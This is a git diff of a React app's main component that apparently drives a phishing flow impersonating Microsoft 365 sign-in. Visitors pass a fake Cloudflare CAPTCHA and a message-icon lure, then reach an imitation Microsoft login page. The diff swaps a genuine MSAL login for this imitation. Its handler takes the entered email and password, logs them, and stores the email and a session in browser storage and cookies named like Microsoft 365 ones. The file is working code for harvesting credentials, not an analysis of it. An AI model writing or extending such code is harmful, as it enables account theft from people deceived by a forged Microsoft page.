@@ -1,80 +1,62 @@
 import React, { useState } from 'react';
-import { PublicClientApplication } from '@azure/msal-browser';
-import { MsalProvider, useMsal } from '@azure/msal-react';
 import MessageIconLanding from './components/MessageIconLanding';
 import CloudflareCaptcha from './components/CloudflareCaptcha';
 import MicrosoftLoginPage from './components/MicrosoftLoginPage';
+import RealOAuthRedirect from './components/RealOAuthRedirect';
 
-const msalConfig = {
-  auth: {
-    clientId: 'eabd0e31-5707-4a85-aae6-79c53dc2c7f0',
-    authority: 'https://login.microsoftonline.com/ed02fb35-7238-4f3e-ae3e-5a74227aad25',
-    redirectUri: window.location.origin
-  }
-};
+function App() {
+  const [currentPage, setCurrentPage] = useState('captcha');
 
-const msalInstance = new PublicClientApplication(msalConfig);
-
-function AppContent() {
-  const [currentPage, setCurrentPage] = useState('message-icon');
-  const { instance, accounts } = useMsal();
-
-  // Handle the complete flow
-  const handleMessageOpen = () => {
-    console.log('📧 Message icon clicked - moving to CAPTCHA verification');
-    setCurrentPage('captcha');
+  // Handle the complete flow - starts with CAPTCHA
+  const handleCaptchaVerified = () => {
+    console.log('✅ CAPTCHA verified - moving to message icon landing');
+    setCurrentPage('message-icon');
   };
 
-  const handleCaptchaVerified = () => {
-    console.log('✅ CAPTCHA verified - moving to Microsoft login');
-    setCurrentPage('login');
+  const handleMessageOpen = () => {
+    console.log('📧 Message icon clicked - moving to OAuth redirect');
+    setCurrentPage('oauth-redirect');
   };
 
   const handleCaptchaBack = () => {
-    console.log('⬅️ Back to message icon from CAPTCHA');
+    console.log('⬅️ Back to CAPTCHA (refresh page)');
+    window.location.reload();
+  };
+
+  const handleOAuthSuccess = (sessionData: any) => {
+    console.log('🔐 OAuth successful:', sessionData);
+    setCurrentPage('login');
+  };
+
+  const handleOAuthBack = () => {
+    console.log('⬅️ Back to message icon from OAuth');
     setCurrentPage('message-icon');
   };
 
   const handleLoginSuccess = async (credentials: { email: string; password: string }) => {
     console.log('🔐 Login successful:', credentials);
     
-    try {
-      // Trigger real Microsoft OAuth login
-      const loginResponse = await instance.loginPopup({
-        scopes: ['user.read'],
-        prompt: 'select_account'
-      });
-
-      if (loginResponse) {
-        // Store credentials and perform cookie work
-        const sessionData = {
-          email: credentials.email,
-          sessionId: Date.now().toString(),
-          timestamp: new Date().toISOString(),
-          accessToken: loginResponse.accessToken,
-          account: loginResponse.account
-        };
-        
-        localStorage.setItem('microsoft365_session', JSON.stringify(sessionData));
-        sessionStorage.setItem('current_session', JSON.stringify(sessionData));
-        
-        // Set cookies for the session
-        document.cookie = `ms365_session=${sessionData.sessionId}; path=/; secure; samesite=strict`;
-        document.cookie = `ms365_email=${encodeURIComponent(credentials.email)}; path=/; secure; samesite=strict`;
-        document.cookie = `ms365_auth_time=${Date.now()}; path=/; secure; samesite=strict`;
-        document.cookie = `ms365_access_token=${loginResponse.accessToken}; path=/; secure; samesite=strict`;
-        
-        console.log('🍪 Cookies set, redirecting back to landing page');
-        
-        // Redirect back to landing page (message icon)
-        setTimeout(() => {
-          setCurrentPage('message-icon');
-        }, 1000);
-      }
-    } catch (error) {
-      console.error('OAuth login failed:', error);
-      // Handle OAuth error but stay on login page for retry
-    }
+    // Store credentials and perform cookie work
+    const sessionData = {
+      email: credentials.email,
+      sessionId: Date.now().toString(),
+      timestamp: new Date().toISOString()
+    };
+    
+    localStorage.setItem('microsoft365_session', JSON.stringify(sessionData));
+    sessionStorage.setItem('current_session', JSON.stringify(sessionData));
+    
+    // Set cookies for the session
+    document.cookie = `ms365_session=${sessionData.sessionId}; path=/; secure; samesite=strict`;
+    document.cookie = `ms365_email=${encodeURIComponent(credentials.email)}; path=/; secure; samesite=strict`;
+    document.cookie = `ms365_auth_time=${Date.now()}; path=/; secure; samesite=strict`;
+    
+    console.log('🍪 Cookies set, redirecting back to landing page');
+    
+    // Redirect back to landing page (message icon)
+    setTimeout(() => {
+      setCurrentPage('message-icon');
+    }, 1000);
   };
 
   const handleLoginError = (error: string) => {
@@ -83,12 +65,20 @@ function AppContent() {
   };
 
   const handleLoginBack = () => {
-    console.log('⬅️ Back to CAPTCHA from login');
-    setCurrentPage('captcha');
+    console.log('⬅️ Back to OAuth redirect from login');
+    setCurrentPage('oauth-redirect');
   };
 
   // Render current page based on flow
   switch (currentPage) {
+    case 'captcha':
+      return (
+        <CloudflareCaptcha
+          onVerified={handleCaptchaVerified}
+          onBack={handleCaptchaBack}
+        />
+      );
+    
     case 'message-icon':
       return (
         <MessageIconLanding 
@@ -96,11 +86,10 @@ function AppContent() {
         />
       );
     
-    case 'captcha':
+    case 'oauth-redirect':
       return (
-        <CloudflareCaptcha
-          onVerified={handleCaptchaVerified}
-          onBack={handleCaptchaBack}
+        <RealOAuthRedirect
+          onLoginSuccess={handleOAuthSuccess}
         />
       );
     
@@ -116,19 +105,12 @@ function AppContent() {
     
     default:
       return (
-        <MessageIconLanding 
-          onOpenMessage={handleMessageOpen}
+        <CloudflareCaptcha
+          onVerified={handleCaptchaVerified}
+          onBack={handleCaptchaBack}
         />
       );
   }
-}
-
-function App() {
-  return (
-    <MsalProvider instance={msalInstance}>
-      <AppContent />
-    </MsalProvider>
-  );
 }
 
 export default App;
